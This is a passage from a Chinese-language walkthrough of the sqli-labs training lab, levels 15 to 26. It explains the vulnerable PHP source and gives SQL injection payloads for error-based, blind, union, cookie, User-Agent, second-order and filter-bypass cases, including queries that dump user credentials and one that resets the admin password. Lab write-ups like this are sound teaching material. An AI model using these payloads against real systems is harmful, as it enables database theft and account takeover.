+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1  --+<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2  --+<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式：<code>password=(&quot;$passwd&quot;)</code></p>
+<p>方法同上</p>
+<hr>
+<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>闭合方式：<code>password = &#39;$passwd&#39;</code></p>
+<p>进行简单测试</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; --+<br><br></code></pre></td></tr></table></figure>
+<p>并没有结果返回</p>
+<p>查看源码后发现，在执行SQL语句之前对输入的用户名做了检查。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params">$value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($value))<br>        &#123;<br>        <span class="hljs-comment">// truncation (see comments)</span><br>        $value = substr($value,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>        &#125;<br> <br>        <span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>        <span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>            &#123;<br>            $value = stripslashes($value);<br>            &#125;<br> <br>        <span class="hljs-comment">// Quote if not a number</span><br>        <span class="hljs-keyword">if</span> (!ctype_digit($value))<br>            &#123;<br>            $value = <span class="hljs-string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            &#125;<br>        <br>    <span class="hljs-keyword">else</span><br>        &#123;<br>        $value = intval($value);<br>        &#125;<br>    <span class="hljs-keyword">return</span> $value;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure>
+<ul>
+<li>magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。在 magic_quotes_gpc = On 的情况下，如果输入的数据有：<ol>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜线（\）</li>
+<li>NULL（NULL 字符）<br>（字符都会被加上反斜线）</li>
+</ol>
+</li>
+<li>stripslashes() 删除由 addslashes() 函数添加的反斜杠</li>
+<li>ctype_digit() 判断是不是数字，是数字就返回 true，否则返回 false</li>
+<li>mysql_real_escape_string() 转义 SQL 语句中使用的字符串中的特殊字符。</li>
+<li>intval()   整型转换</li>
+</ul>
+<p>但是没有对密码进行限制，password被直接拼接到SQL语句中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-variable">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-variable">$row1</span>&#x27;&quot;</span>;<br><br></code></pre></td></tr></table></figure>
+<p>然后发现使用 <code>passwd=Dumb&#39; and 1=1 --+&amp;uname=Dumb</code> 会发生报错并将报错信息进行显示。发送下面的数据，就可以进行报错注入。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, user(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>) --+&amp;uname=Dumb<br><br></code></pre></td></tr></table></figure>
+
+<p>时间盲注 Payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&#x27;  WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;Dumb&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(1, sleep(3), 2) --+&amp;<span class="hljs-attribute">uname</span>=Dumb # 明显延时<br><span class="hljs-attribute">passwd</span>=Dumb&#x27;  WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;Dumb&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(0, sleep(3), 2) --+&amp;<span class="hljs-attribute">uname</span>=Dumb<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p>
+<p>登陆之后，发现查询到的信息是 User-agent，尝试在 Hackbar 添加 Header。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/65A5263E-2378-4E6B-BAEF-B7C5F43C18A9.png" srcset="/img/loading.gif"><br>发现报错信息，说明可以采用报错注入的方式获得回显信息。</p>
+<p>尝试闭合SQL语句</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) --+<br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) #<br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) %<span class="hljs-number">23</span><br><br></code></pre></td></tr></table></figure>
+<p>并没有收获</p>
+<p>查看源码后发现 password 和 username 都被上一题的检查函数所检查，而 User-agent 在另一个 SQL 语句（插入数据）中，所以不管怎么包裹都无法在 INSERT 语句中得到回显。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8BF2BB30-E839-4B64-AF48-5BD66400980E.png" srcset="/img/loading.gif"><br>故需要换一种闭合方式（在两侧进行闭合）</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali"><br>&#x27;<span class="hljs-built_in"> and </span>sleep(3)<span class="hljs-built_in"> and </span>&#x27;<br><br></code></pre></td></tr></table></figure>
+<p>将 INSERT 语句闭合成</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`security`</span>.<span class="hljs-symbol">`uagents`</span> (<span class="hljs-symbol">`uagent`</span>, <span class="hljs-symbol">`ip_address`</span>, <span class="hljs-symbol">`username`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;Dumb&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+<p>uagent 字段就会被插入’’和’’进行与运算的结果（即0）</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; select &#x27;&#x27; and sleep(3) and &#x27;<span class="hljs-emphasis">&#x27;;</span><br><span class="hljs-emphasis">+------------------------+</span><br><span class="hljs-emphasis">| &#x27;</span>&#x27; and sleep(3) and &#x27;&#x27; |<br><span class="hljs-code">+------------------------+</span><br>|                      0 |<br><span class="hljs-code">+------------------------+</span><br>1 row in set (0.00 sec)<br><br></code></pre></td></tr></table></figure>
+
+<p>报错注入payload</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>) and &#x27;<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p>
+<p>同上题配置，仅字段不同，报错注入 Payload<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B2E0F540-D020-4071-8CEC-6350DF9B793E.png" srcset="/img/loading.gif"></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>) and &#x27;<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>闭合方式：<code>username=&#39;$cookee&#39;</code></p>
+<p>推荐插件 <code>EditThisCookie</code></p>
+<p>登陆之后，网页中存储了键为 Dumb、值为 Dumb的 Cookie。修改 Cookie 值之后，进行刷新就能看见报错信息</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># 修改Cookie的值为</span><br>Dumb<span class="hljs-string">&#x27; #</span><br><span class="hljs-string"># 这里不能使用 --+。原因：+ 号在 Cookie 中不会被 URL 解码为空格可以采用下面这种方式。</span><br><span class="hljs-string">Dumb&#x27;</span>--%<span class="hljs-number">20</span><br><br><br><span class="hljs-comment"># 测试回显的字段</span><br>Dum<span class="hljs-string">&#x27; union select 1, 2, 3--%20</span><br><span class="hljs-string"># 查看数据库</span><br><span class="hljs-string">Dum&#x27;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1, 2, <span class="hljs-title">database</span>()--%20</span><br><br></code></pre></td></tr></table></figure>
+
+<p>联合注入 Payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dum</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, database()--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure>
+
+<p>报错注入 Payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dum</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, database(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure>
+
+<p>布尔盲注 Payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dumb</span>&#x27; and if(database()=&#x27;security&#x27;, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure>
+
+<p>时间盲注 Payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dumb</span>&#x27; and if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h1 id="3-高级注入-21-37"><a href="#3-高级注入-21-37" class="headerlink" title="3 高级注入(21-37)"></a>3 高级注入(21-37)</h1><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>闭合方式：<code>username=(&#39;$cookee&#39;)</code></p>
+<p>关键词：cookie、base64加密、单引号和括号</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># 进行简单的闭合</span><br><span class="hljs-attribute">Dumb</span>&#x27;) #<br><span class="hljs-comment"># base64加密后：RHVtYicpICM=</span><br><br><span class="hljs-comment"># Union注入Payload</span><br><span class="hljs-attribute">Dum</span>&#x27;) union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>#<br><br><span class="hljs-comment"># 报错注入Payload</span><br><span class="hljs-attribute">Dum</span>&#x27;) and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, database(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)-- （最后有一个空格，也可以使用#）<br><span class="hljs-comment"># base64加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0g</span><br><span class="hljs-comment"># 没有空格加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0=</span><br><br><span class="hljs-comment"># 时间盲注Payload</span><br><span class="hljs-attribute">Dumb</span>&#x27;) and if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>)#<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>闭合方式： <code>username=&quot;$cookee&quot;</code></p>
+<p>关键词：cookie、base64加密、双引号</p>
+<p>同上一题，将单引号和括号改为双引号即可</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># Union注入Payload</span><br><span class="hljs-string">Dum&quot;</span> <span class="hljs-string">union</span> <span class="hljs-string">select</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>关键词：基于错误、过滤注释</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br># 尝试进行闭合（注释被替换成为空）<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> &#x27;<span class="hljs-number">1</span><br><br># 国光大师傅的Payload：<br>?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(SELECT(@<span class="hljs-params">x</span>:=0x00)</span> ,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(<span class="hljs-params">users</span>)</span><span class="hljs-constructor">WHERE(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">IN(@<span class="hljs-params">x</span>:=CONCAT(0x20,@<span class="hljs-params">x</span>,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>,0x3c62723e)</span>)))x),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-character">&#x27;1&#x27;</span>=&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//filter the comments out so as to comments should not work</span><br>$reg = <span class="hljs-string">&quot;/#/&quot;</span>;<br>$reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;<br>$replace = <span class="hljs-string">&quot;&quot;</span>;<br>$id = preg_replace($reg, $replace, $id);<br>$id = preg_replace($reg1, $replace, $id);<br><br></code></pre></td></tr></table></figure>
+
+<p>正如源码所示，将 # 和 – 替换为空，所以可以采用闭合的方式进行注入。</p>
+<hr>
+<h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>关键词：经典二次注入、存储注入</p>
+<p>二次注入通常在注册的位置，插入数据的时候不会产生错误信息，但是在执行其他语句的时候发生了错误。<br>（第一次是向数据库插入Payload，第二次是利用Payload）</p>
+<p>Update语句</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br></code></pre></td></tr></table></figure>
+<p>当用户名为 admin’# 时，sql 语句会变成</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;admin&#x27;</span># <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br></code></pre></td></tr></table></figure>
+<p>这样就会修改 admin 的密码，而不是我自己注册的账号。</p>
+<p>通过这个页面 <a target="_blank" rel="noopener" href="http://localhost:4000/Less-24">http://localhost:4000/Less-24</a> 进入注册页面失败，发现是文件路径未找到。在后面填加 index 之后就正常执行了，即访问：<a target="_blank" rel="noopener" href="http://localhost:4000/Less-24/index.php%E3%80%82">http://localhost:4000/Less-24/index.php。</a></p>
+<p>注册新用户<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5B29A116-C50E-4DB1-A821-6345CC7FB629.png" srcset="/img/loading.gif"><br>在修改页面进行密码修改，即可修改 admin 的密码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8EBA386F-FB14-45C1-AE56-1D196A017E6B.png" srcset="/img/loading.gif"></p>
+<hr>
+<h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>关键词：GET 类型、过滤 and+or。</p>
+<p>关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">$id</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $id= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><br>    $id= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><br>    <br>    <span class="hljs-keyword">return</span> $id;<br>&#125;<br><br>$id= blacklist($id);<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure>
+<p>这里的 or 和 and 只被替换了一次，所以可以采用双写绕过。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 联合注入 Payload</span><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># 其中 password 改为 passwoord，separator 改为 separatoorr（设置分隔符），0x3c62723e 是十六进制的&lt;br&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>and 可以使用 &amp;&amp; 替换，or 使用 || 替换</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 报错注入Payload<br>?id=<span class="hljs-number">1</span>&#x27;||extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))--+<br>?id=<span class="hljs-number">1</span>&#x27;||extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>)+FROM+users)))--+<br><br></code></pre></td></tr></table></figure>
+<h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>关键词：报错注入、过滤空格和注释符、过滤 and 和 or、单引号</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment"># 过滤了 or 和 and 大小写</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-regexp">//</span>strip out OR (non case sensitive)<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out AND (non case sensitive)<br><br><br><span class="hljs-comment"># 过滤了 /*</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>strip out /*<br><br><br><span class="hljs-comment"># 过滤了 -- 和 # 注释</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out --<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#</span><br><br><br><span class="hljs-comment"># 过滤了空格</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out spaces<br><br><br><span class="hljs-comment"># 过滤了斜线</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out slashes<br>return <span class="hljs-variable">$id</span>;<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤 or 和 and：可以用 &amp;&amp; 和 || 替换或者采用双写的方式绕过</li>
+<li>过滤空格：可以用下表的字符进行替换<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB 键(水平) <br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行 <br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页 <br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return 功能 <br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB 键(垂直) <br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格 <br><br></code></pre></td></tr></table></figure></li>
+<li>过滤注释：可以用两侧闭合方式绕过。例如：less-23<br>可以构建 Payload 得：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 测试是否可以执行<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br># 其中%<span class="hljs-number">26</span>是&amp;，使用两侧闭合方式绕过注释<br><br># 报错注入Payload<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))%<span 